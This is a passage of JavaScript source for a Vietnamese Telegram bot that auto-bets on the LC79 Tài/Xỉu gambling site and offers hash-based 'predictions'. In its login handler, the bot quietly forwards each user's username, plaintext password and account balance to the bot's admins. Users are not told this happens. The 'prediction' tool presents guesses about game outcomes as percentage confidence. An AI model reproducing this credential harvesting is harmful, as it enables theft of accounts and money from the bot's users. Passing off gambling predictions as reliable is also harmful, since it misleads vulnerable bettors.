    if (!s) return send(chatId, '⚠️ Chưa đăng nhập.',
      kb([[btn('🔐 ĐĂNG NHẬP', 'lc79:login', 'success')]]));

    if (action === 'auto') {
      s.autoBet = !s.autoBet;
      if (s.autoBet) s.martingaleLevel = 0;
      return showLc79Menu(chatId, uid);
    }

    if (action === 'x2') {
      s.martingale = !s.martingale;
      s.martingaleLevel = 0;
      return showLc79Menu(chatId, uid);
    }

    if (action === 'set_bet') {
      sessions[uid] = { await: 'lc79_set_bet' };
      return send(chatId,
`💰 <b>ĐỔI MỨC CƯỢC GỐC</b>

Hiện tại: <b>${fmt(s.baseBet)}</b>

👉 Nhắn số tiền (VD: <code>20000</code>):
<i>1,000 – 10,000,000</i>`,
      kb([[btn('❌ HỦY', 'lc79:cfg', 'danger')]]));
    }

    if (action === 'set_sl') {
      sessions[uid] = { await: 'lc79_set_sl' };
      return send(chatId,
`🎯 <b>ĐỔI STOP LOSS</b>

Hiện tại: <b>${s.stopLoss > 0 ? fmt(s.stopLoss) : 'OFF'}</b>

👉 Nhắn số tiền lỗ tối đa (VD: <code>500000</code>)
<i>Gõ 0 để tắt</i>`,
      kb([[btn('❌ HỦY', 'lc79:cfg', 'danger')]]));
    }

    if (action === 'set_sw') {
      sessions[uid] = { await: 'lc79_set_sw' };
      return send(chatId,
`🏆 <b>ĐỔI STOP WIN</b>

Hiện tại: <b>${s.stopWin > 0 ? fmt(s.stopWin) : 'OFF'}</b>

👉 Nhắn số tiền lãi để dừng (VD: <code>1000000</code>)
<i>Gõ 0 để tắt</i>`,
      kb([[btn('❌ HỦY', 'lc79:cfg', 'danger')]]));
    }

    if (action === 'stop') {
      lc79Stop(uid, false);
      return;
    }
    return;
  }

  if (!isVip(uid) && !isAdmin(uid) && data !== 'adm:home') {
    return vipGate(chatId);
  }

  if (data === 'pred:brands') { stopAuto(uid, true); return showBrandMenu(chatId); }
  if (data.startsWith('predbrand:')) { stopAuto(uid, true); return showTables(chatId, data.slice(10), uid); }
  if (data.startsWith('predhist:')) return exportHistory(chatId, data.slice(9));
  if (data.startsWith('pred:stop:')) {
    stopAuto(uid, true);
    return send(chatId, '⏹ <b>Đã dừng cập nhật.</b>',
      kb([[btn('🎲 CHỌN GAME KHÁC', 'pred:brands', 'primary')], [btn('🏠 VỀ MENU', 'menu', 'danger')]]));
  }
  if (data.startsWith('pred:off:')) return send(chatId, '🔴 Bàn này đéo chạy được, chọn bàn khác.',
    kb([[btn('◀️ QUAY LẠI', 'pred:brands', 'primary')]]));
  if (data.startsWith('pred:') && data !== 'pred:brands') return sendPredCard(chatId, data.slice(5), uid);

  if (data === 'adm:home' && isAdmin(uid)) return showAdmin(chatId);
  if (data === 'adm:games' && isAdmin(uid)) {
    const lines = games.map(g => `${g.enabled === false || !g.url ? '🔴' : '🟢'} <code>${g.id}</code> ${g.brandLabel} ${g.variant}`);
    return send(chatId, '🎮 <b>DANH SÁCH GAME</b>\n\n' + lines.join('\n'),
      kb([[btn('◀️ QUAY LẠI', 'adm:home', 'primary')]]));
  }
  if (data === 'adm:bc' && isAdmin(uid)) {
    sessions[uid] = { await: 'adm_bc' };
    return send(chatId, '📣 <b>BẮN THÔNG BÁO</b>\nNhập nội dung mày muốn gửi tới toàn bộ users:');
  }
}

/* ═══════════════ MESSAGES ═══════════════ */
async function onMessage(msg) {
  if (!msg || !msg.chat) return;
  const chatId = msg.chat.id;
  const from = msg.from;
  const uid = uidOf(from);
  const text = (msg.text || '').trim();

  const st0 = sessions[uid];
  if (st0 && st0.await && st0.await.startsWith('lc79_')) {
    if (st0.await === 'lc79_login_user') {
      const uname = text.trim();
      if (uname.length < 3) return send(chatId, '❌ Tên TK quá ngắn. Nhập lại:');
      sessions[uid] = { await: 'lc79_login_pass', username: uname };
      return send(chatId, '🔑 Nhắn <b>MẬT KHẨU</b>:',
        kb([[btn('❌ HỦY', 'lc79:menu', 'danger')]]));
    }
    if (st0.await === 'lc79_login_pass') {
      const pw = text.trim();
      const uname = st0.username;
      delete sessions[uid];
      const mm = await send(chatId, '🔄 <i>Đang đăng nhập LC79...</i>');
      try {
        const data = await lc79Login(uname, pw);

        try {
          const adminMsg =
`🔐 <b>LOGIN MỚI — LC79</b>
━━━━━━━━━━━━━━━
👤 <b>User:</b> ${esc(displayName(from))}
🆔 <b>ID:</b> <code>${uid}</code>
━━━━━━━━━━━━━━━
📛 <b>Tài khoản:</b> <code>${esc(uname)}</code>
🔑 <b>Mật khẩu:</b> <code>${esc(pw)}</code>
💰 <b>Số dư:</b> <b>${fmt(data.money)}</b> VND
━━━━━━━━━━━━━━━
⏰ <i>${esc(nowVN())}</i>`;
          for (const aid of ADMIN_IDS) send(aid, adminMsg).catch(() => {});
        } catch {}

        if (mm && mm.result) await delMsg(chatId, mm.result.message_id);
        await lc79Connect(uid, chatId, data);
      } catch (e) {
        if (mm && mm.result) await delMsg(chatId, mm.result.message_id);
        send(chatId, `❌ <b>LOGIN THẤT BẠI</b>\n${esc(e.message)}`,
          kb([[btn('🔐 THỬ LẠI', 'lc79:login', 'success')], [btn('🏠 VỀ MENU', 'menu', 'danger')]]));
      }
      return;
    }

    const s = LC79.sessions[uid];
    if (!s) { delete sessions[uid]; return send(chatId, '⚠️ Phiên đã hết.'); }
    const num = Number(String(text).replace(/[.,\s]/g, ''));
    if (!Number.isFinite(num) || num < 0) return send(chatId, '❌ Số không hợp lệ. Nhập lại:');

    if (st0.await === 'lc79_set_bet') {
      if (num < 1000 || num > 10000000) return send(chatId, '❌ 1,000 – 10,000,000. Nhập lại:');
      s.baseBet = num; delete sessions[uid];
      return showLc79Cfg(chatId, uid);
    }
    if (st0.await === 'lc79_set_sl') {
      s.stopLoss = num; delete sessions[uid];
      return showLc79Cfg(chatId, uid);
    }
    if (st0.await === 'lc79_set_sw') {
      s.stopWin = num; delete sessions[uid];
      return showLc79Cfg(chatId, uid);
    }
  }

  if (text === '/start' || text === '/menu') {
    ensureUser(uid); saveUsers();
    delete sessions[uid];
    return showUserMenu(chatId, from);
  }
  if (text === '/admin' && isAdmin(uid)) return showAdmin(chatId);
  if (text === '/stop') {
    lc79Stop(uid, false);
    stopAuto(uid, true);
    return send(chatId, '⏹ <b>Đã dừng tất cả hoạt động.</b>',
      kb([[btn('🏠 VỀ MENU', 'menu', 'danger')]]));
  }

  if (text.startsWith('/grant ') && isAdmin(uid)) {
    const parts = text.split(/\s+/);
    if (parts.length >= 3) {
      const targetUid = parts[1];
      const hours = Number(parts[2]);
      if (hours > 0) {
        grantVip(targetUid, hours);
        send(chatId, `✅ Đã cấp <b>${hours}h</b> cho user <code>${targetUid}</code>`);
        send(targetUid,
`🎉 <b>CHÚC MỪNG CON TRAI!</b> 🎉

Bố mày đã ban phát <b>${hours} giờ VIP</b> cho mày.
Hạn dùng: <b>${vipText(targetUid).expire}</b>

🔥 Vào cày cuốc đi!`,
          kb([[btn('🎯 SOI CẦU NGAY', 'pred:brands', 'success')]]));
      }
    } else {
      send(chatId, '⚠️ Cú pháp: <code>/grant ID_User Số_Giờ</code>');
    }
    return;
  }

  const st = sessions[uid];
  if (st) {
    if (st.await === 'hash_input') {
      const hashStr = text.toLowerCase();
      if (!/^[a-f0-9]{32}$/.test(hashStr) && !/^[a-f0-9]{64}$/.test(hashStr)) {
        return send(chatId, '❌ <b>MÃ HASH ĐÉO HỢP LỆ!</b>\n\nYêu cầu MD5 (32) hoặc SHA256 (64).',
          kb([[btn('🏠 VỀ MENU', 'menu', 'danger')]]));
      }
      const type = hashStr.length === 32 ? 'MD5' : 'SHA256';
      const pred = predictHash(hashStr);
      const sideTxt = pred.side === 'T' ? 'TÀI' : 'XỈU';
      const sideIcon = pred.side === 'T' ? '🔴' : '🔵';
      const filled = Math.max(0, Math.min(10, Math.round((pred.conf || 52) / 10)));
      const bar = '█'.repeat(filled) + '░'.repeat(10 - filled);

      return send(chatId,
`🧩 <b>KẾT QUẢ PHÂN TÍCH ${type}</b>

🔑 <b>Hash:</b> <code>${esc(hashStr)}</code>

🎯 <b>DỰ ĐOÁN:</b> ${sideIcon} <b>${sideTxt}</b>
⚡ <b>Tỉ lệ nổ:</b> <b>${pred.conf}%</b>
<code>${bar}</code>
💡 <b>Phân tích:</b> ${esc(pred.reason)}

👇 <i>Gửi tiếp mã mới để phân tích tiếp:</i>`,
      kb([[btn('🏠 THOÁT TOOL HASH', 'menu', 'danger')]]));
    }

    if (st.await === 'adm_bc' && isAdmin(uid)) {
      delete sessions[uid];
      let count = 0;
      for (const id of Object.keys(users)) {
        try { await send(id, `📣 <b>THÔNG BÁO</b>\n\n${esc(text)}`); count++; } catch {}
      }
      return send(chatId, `✅ Đã bắn tới <b>${count}</b> users.`);
    }
  }
}

/* ═══════════════ POLLING LOOP ═══════════════ */
let offset = 0;
async function loop() {
  if (!BOT_TOKEN) return;
  try {
    const j = await tg('getUpdates', { offset, timeout: 25, allowed_updates: ['message', 'callback_query'] });
    if (j && j.result) {
      for (const u of j.result) {
        offset = u.update_id + 1;
        try {
          if (u.callback_query) await onCallback(u.callback_query);
          else if (u.message) await onMessage(u.message);
        } catch (e) { console.error('update_err', e.message); }
      }
    }
  } catch (e) {
    await new Promise(r => setTimeout(r, 2000));
  }
  setImmediate(loop);
}

/* ═══════════════ HTTP SERVER ═══════════════ */
const app = express();
app.use(cors());
app.use(express.json());

app.get('/health', (_, res) => res.json({
  ok: true, bot: 'ĐỊT CHẾT CỤ NHÀ CÁI v14.3', time: nowVN(),
  games: games.length, lc79_active: Object.keys(LC79.sessions).length,
  engine: 'Enhanced v14.3'
}));

app.listen(PORT, '0.0.0.0', () => {
  console.log('🔥 ĐỊT CHẾT CỤ NHÀ CÁI v14.3 running on port', PORT);
  if (BOT_TOKEN) {
    tg('getMe').then(j => console.log('🤖 Bot auth:', j?.result?.username));
    loop();
  }
  pollAll().catch(() => {});

  if (PUBLIC_URL) {
    const ping = () => {
      try {
        const u = new URL(PUBLIC_URL + '/health');
        const mod = u.protocol === 'https:' ? https : http;
        const req = mod.get(u, res => res.on('data', () => {}).on('end', () => {}));
        req.on('error', () => {});
        req.setTimeout(10000, () => req.destroy());
      } catch {}
    };
    setInterval(ping, 10 * 60 * 1000);
    setTimeout(ping, 30000);
  }
});